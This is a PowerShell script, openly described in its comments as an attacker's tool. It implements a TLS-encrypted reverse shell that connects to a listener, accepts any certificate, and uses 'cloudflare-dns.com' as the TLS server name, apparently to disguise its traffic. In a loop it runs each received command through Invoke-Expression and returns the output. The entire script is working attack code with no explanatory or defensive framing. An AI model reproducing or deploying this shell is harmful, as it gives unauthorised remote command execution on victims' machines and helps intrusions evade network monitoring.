# Specify SSL Protocol (TLS 1.2)
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12

# Set up the TCP client and network stream
$TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 5050)
$NetworkStream = $TCPClient.GetStream()

# Set up SSL stream with client certificate validation (bypassed for now)
$SslStream = New-Object Net.Security.SslStream(
    $NetworkStream, 
    $false, 
    ({$true} -as [Net.Security.RemoteCertificateValidationCallback])  # Accept all certs
)

# Authenticate SSL connection as client (using Cloudflare DNS as a server for handshake)
$SslStream.AuthenticateAsClient('cloudflare-dns.com', $null, $sslProtocols, $false)

# Check if the stream is properly encrypted and signed
if (!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
    $SslStream.Close()
    exit
}

# Initialize StreamReader and StreamWriter for easier reading/writing
$StreamReader = New-Object IO.StreamReader($SslStream)
$StreamWriter = New-Object IO.StreamWriter($SslStream)
$StreamWriter.AutoFlush = $true  # Automatically flush after writing

# Function to send output to the attacker
function WriteToStream ($String) {
    $StreamWriter.WriteLine($String + 'SHELL> ')
}

# Send initial prompt
WriteToStream ''

# Loop to continuously read commands, execute them, and send the output back
while ($true) {
    # Read incoming command from the attacker
    $Command = $StreamReader.ReadLine()

    # Exit if no command is received
    if ($Command -eq $null) { break }

    # Execute the command and capture the output
    try {
        $Output = Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $Output = $_.Exception.Message
    }

    # Send back the output of the command
    WriteToStream $Output
}

# Close the stream and client connection after the loop ends
$StreamReader.Close()
$StreamWriter.Close()
$SslStream.Close()
$TCPClient.Close()
